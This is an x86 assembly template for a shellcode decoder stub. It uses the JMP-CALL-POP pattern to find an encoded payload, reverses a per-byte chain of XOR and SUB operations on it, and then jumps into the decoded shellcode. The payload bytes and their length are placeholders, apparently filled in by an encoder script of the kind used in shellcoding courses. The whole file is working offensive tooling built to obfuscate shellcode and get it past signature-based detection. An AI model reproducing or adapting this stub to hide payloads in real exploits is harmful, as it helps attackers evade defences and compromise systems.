global _start

section .text write progbits
    _start:   
        jmp short shellcode

    decoder:
        pop eax                 ; store encodedShellcode address in eax - the address we will jump to once all the bytes have been decoded

    setup:
        xor ecx, ecx
        mov edx, @SHELLCODE_LENGTH@

    decoderStub:
        cmp ecx, edx
        je encodedShellcode
        
        ; decode
        xor byte [eax], 0x39
        sub byte [eax], 0x13
        xor byte [eax], 0x7
        xor byte [eax], 0xF
        
        inc eax                 ; point eax to the next encoded byte in encodedShellcode
        inc ecx
        jmp short decoderStub
            
    shellcode:
        call decoder
        encodedShellcode: db @ENCODED_SHELLCODE@